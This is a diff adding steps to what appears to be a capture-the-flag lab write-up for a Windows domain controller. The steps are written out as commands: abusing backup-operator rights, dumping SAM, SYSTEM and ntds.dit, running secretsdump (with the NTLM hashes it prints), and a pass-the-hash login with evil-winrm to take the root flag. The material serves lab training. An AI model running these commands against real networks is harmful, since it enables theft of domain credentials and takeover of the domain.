@@ -59,4 +59,32 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 ## What is the Administrator user's domain hash?
 
-- Answer: 
+- Command: netexec smb 10.129.34.60 -u Caroline.Robinson -p 'ResetPassword2026!' -M backup_operator
+
+- Command: smbclient //10.129.34.60/SYSVOL -U 'baby.vl\Caroline.Robinson%ResetPassword2026!'
+
+- Command: get SAM
+
+- Command: get SYSTEM
+
+- Command: impacket-secretsdump -sam SAM -system SYSTEM local
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
+
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+- Command: mkdir C:\Users\Caroline.Robinson\Documents\NTDS
+
+- Command: esentutl /y /v "C:\Windows\NTDS\ntds.dit" /d "C:\Users\Caroline.Robinson\Documents\NTDS\ntds.dit"
+
+
+- Answer: ee4457ae59f1e3fbd764e33d9cef123d
+
+
+## Root Flag
+
+- Command: evil-winrm-py -i BABYDC.baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
+
+- Answer: 9644cbf2b8fb349ce894225b8502bf0a
